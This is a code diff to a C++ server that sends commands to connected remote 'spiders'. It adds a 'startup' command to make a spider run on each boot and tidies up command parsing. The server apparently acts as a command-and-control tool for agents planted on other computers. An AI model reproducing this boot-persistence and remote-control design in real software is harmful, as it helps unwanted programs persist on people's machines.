@@ -22,6 +22,7 @@ Server::Server(uint16_t port)
   boost::filesystem::create_directory("Logs");
   _signal.addSignal(SIGINT);
 
+  _commandsSpider["startup"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(5));
   _commandsSpider["kill"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(6));
   _commandsSpider["pause"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(7));
   _commandsSpider["destroy"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(8));
@@ -61,6 +62,7 @@ int		Server::help()
 	    << "\tkill [Spider1 ...]\t\t- Kill spiders" << std::endl
 	    << "\tpause [Spider1 ...]\t\t- Pause spiders" << std::endl
 	    << "\tdestroy [Spider1 ...]\t\t- Delete spiders from computers" << std::endl
+	    << "\tstartup [Spider1 ...]\t\t- Make spider run automatically on each boot" << std::endl
 	    << "\tlist\t\t\t\t- List spiders connected" << std::endl
 	    << "\tquit\t\t\t\t- Quit server" << std::endl
 	    << "\thelp\t\t\t\t- Disp help" << std::endl;
@@ -82,14 +84,14 @@ void		Server::readCommand()
 
 	int	found = 0;
 
+	boost::trim(input);
+	boost::split(strs, input, boost::is_any_of("\t "), boost::token_compress_on);
+
 	for (auto &command : _commandsSpider) {
 
+	  if (boost::equals(strs.front(), command.first)) {
 
-	  if (boost::starts_with(input, command.first)) {
-
-	    boost::split(strs, input, boost::is_any_of("\t "), boost::token_compress_on);
 	    strs.pop_front();
-
 	    if (!strs.size()) {
 	      _web->sendCommand(command.second);
 	    }
@@ -101,12 +103,12 @@ void		Server::readCommand()
 	}
 
 	for (auto &command : _commandsServer) {
-	  if (boost::equals(input, command.first)) {
+	  if (boost::equals(strs.front(), command.first)) {
 	    command.second();
 	    found = 1;
 	  }
 	}
-	if (!found) {
+	if (!found && input.size()) {
 	  std::cout << "Unknown command" << std::endl;
 	}
       }
